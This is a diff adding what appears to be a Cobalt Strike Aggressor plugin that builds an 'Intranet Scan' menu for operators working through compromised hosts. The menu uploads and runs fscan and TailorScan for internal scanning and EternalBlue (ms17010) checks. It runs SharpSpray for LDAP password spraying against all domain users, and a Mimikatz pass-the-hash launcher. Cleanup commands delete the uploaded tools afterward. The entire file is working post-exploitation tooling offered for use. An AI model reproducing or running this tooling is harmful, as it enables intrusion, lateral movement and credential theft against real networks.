@@ -1,0 +1,110 @@
+menu "Intranet Scan" {
+menu "fscan" {
+item "Upload fscan" {
+$bid = $1;
+$dialog = dialog("Upload fscan", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &fscan);
+dialog_description($dialog, "Supports host survival detection, port scanning, common service blasting, ms17010, redis batch writing private keys, scheduled task rebound shell, read win network card information, etc. Project address: https://github.com/shadow1ng/fscan");
+drow_text($dialog, "UploadPath", "Upload path: ");
+dbutton_action($dialog, "Upload");
+dialog_show($dialog);
+}
+sub fscan {
+bcd($bid, $3['UploadPath']);
+bupload($bid, script_resource("/scripts/Intranet scanning/fscan.exe"));
+}
+item "Run fscan"{
+$bid = $1['@'];
+$dialog = dialog("Run fscan",%(exec => "fscan.exe -h 192.168.1.1/24 -o ok.txt", bid => $bid),&fscan_run);
+dialog_description($dialog, "Pay attention to the instructions for use of the console output, and enter the execution command directly below:");
+drow_text($dialog, "exec", "Exec: ");
+dbutton_action($dialog, "Run");
+dialog_show($dialog);
+}
+sub fscan_run{
+$exec = $3['exec'];
+bshell($bid, "$exec");
+}
+item "Delete fscan"{
+$bid = $1['@'];
+bshell($bid, "taskkill -f /im fscan.exe & del /f /s /q fscan.exe");
+}
+}
+  item "SharpWebScan (detect web service)" {
+$bid = $1['@'];
+$dialog = dialog("SharpWebScan", %(iptype => "-IP",ip => beacon_info($bid,"internal"),port => "80,443,7001,8000,8001,8080,8888",bid => $bid), &SharpWebScan);
+dialog_description($dialog, "Scan IP or C segment web service, get Title, customizable multi-port scanning, return web address and title. Project address: https://github.com/RcoIl/CSharp-Tools/tree/master/SharpWebScan");
+drow_text($dialog, "ip", "ip: ");
+drow_text($dialog, "port", "ports: ");
+drow_combobox($dialog, "iptype", "-ip/-cip", @("-IP", "-CIP"));
+dbutton_action($dialog, "Run");
+dialog_show($dialog);
+}
+sub SharpWebScan {
+$arg = join(' ', @($3['iptype'],$3['ip'],$3['port']));
+bexecute_assembly($bid, script_resource("/scripts/Intranet scanning/SharpWebScan.exe"), $arg);
+}
+
+menu "TailorScan (Seamless Intranet Scanner)" {
+item "Upload TailorScan" {
+$bid = $1;
+$dialog = dialog("Upload TailorScan", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &TailorScan);
+dialog_description($dialog, "Support port scanning, identify services, get title, scan multiple network cards, ms17010 scan, icmp survival detection. Project address: https://github.com/uknowsec/TailorScan");
+drow_text($dialog, "UploadPath", "Upload path: ");
+dbutton_action($dialog, "Upload");
+dialog_show($dialog);
+}
+sub TailorScan {
+bcd($bid, $3['UploadPath']);
+bupload($bid, script_resource("/scripts/Intranet scanning/TailorScan.exe"));
+}
+item "Run TailorScan"{
+$bid = $1['@'];
+btask($bid, " ", "");
+btask($bid, "TailorScan.exe", "");
+btask($bid, " ", "");
+btask($bid, "Scan IP format support:", "");
+btask($bid, " 192.168.1.1", "");
+btask($bid, " 192.168.1.1-10", "");
+btask($bid, " 192.168.1.*", "");
+btask($bid, " 192.168.1.0/24", "");
+btask($bid, " ", "");
+btask($bid, "Port supports custom list, separated by ',', such as:", "");
+btask($bid, " 21,22,80-99,8000-8080", "");
+btask($bid, " ", "");
+btask($bid, "Port scan, supports tcp, icmp:", "");
+btask($bid, " TailorScan.exe portscan 192.168.0.1/24 80,8080 tcp", "");
+btask($bid, " TailorScan.exe portscan 192.168.0.1/24 tcp", ""); btask($bid, " ", ""); btask($bid, "Eternal Blue Detection:", ""); btask($bid, " TailorScan.exe ms17010 -i 192.168.0.1", ""); btask($bid, " TailorScan.exe ms17010 -n 192.168.0.1/24", ""); btask($bid, " ", ""); btask($bid, "OXID Find：", ""); btask($bid, " TailorScan.exe oxidfind -i 192.168.0.1", ""); btask($bid, " TailorScan.exe oxidfind -n 192.168.0.1/24", "");
+btask($bid, " ", "");
+btask($bid, "ICMP check：", "");
+btask($bid, " TailorScan.exe icmpcheck 192.168.0.1/24", "");
+btask($bid, " ", "");
+$dialog = dialog("Run TailorScan",%(exec => "TailorScan.exe ms17010 -n 192.168.0.1/24", bid => $bid),&TailorScan_run);
+dialog_description($dialog, "Pay attention to the instructions for use of the console output, and enter the execution command directly below:");
+drow_text($dialog, "exec", "Exec: ");
+dbutton_action($dialog, "Run");
+dialog_show($dialog);
+}
+sub TailorScan_run{
+$exec = $3['exec'];
+bshell($bid, "$exec");
+}
+item "Delete TailorScan"{
+$bid = $1['@'];
+bshell($bid, "taskkill -f /im TailorScan.exe & del /f /s /q TailorScan.exe");
+}
+}
+
+item "SharpSpray (Domain Password Explosion)" {
+$bid = $1['@'];
+$dialog = dialog("SharpSpray", %(passwd => "123,888",Delay => "1000",Sleep => "1",bid => $bid), &SharpSpray);
+dialog_description($dialog, "Use LDAP to perform password spray attack on all users in the domain. seeds: specify several password generation dictionaries, separated by commas. passwords: specify password blasting, multiple passwords can be separated by commas. delay: password spray delay, in milliseconds. sleep: The number of minutes between password guesses. Project address: https://github.com/jnqpblc/SharpSpray");
+drow_combobox($dialog, "type", "type:", @("--Seeds","--Passwords"));
+drow_text($dialog, "passwd", "passwd: ");
+drow_text($dialog, "Delay", "Delay: ");
+drow_text($dialog, "Sleep", "Sleep: ");
+dbutton_action($dialog, "Run");
+dialog_show($dialog);
+}
+sub SharpSpray {
+$arg = join(' ', @($3['type'],$3['passwd'],"--Sleep",$3['Sleep'],"--Delay",$3['Delay']));
+bexecute_assembly($bid, script_resource("/scripts/Intranet scanning/SharpSpray.exe"), $arg); } item "Mimikatz-pth"{ local('$bid'); foreach $bid ($1){ mimikatz_passthehash($bid); } } sub mimikatz_passthehash{ $bid = $1; $dialog = dialog("Pass-The-Hash" , %(beacon => $1 , domain => "xxx.com" , user => "administrator" , hash => "hash") , lambda({ bpassthehash($3["beacon"] , $3["domain"] , $3["user"] , $3["hash"]); })); dialog_description($dialog, "mimikatz pass-the-hash attack."); drow_text($dialog, "beacon", "Beacon:"); drow_text($dialog, "domain", "Domain:"); drow_text($dialog, "user", "User:"); drow_text($dialog, "hash", "Hash:"); dbutton_action($dialog, "Launch"); dialog_show($dialog); } }
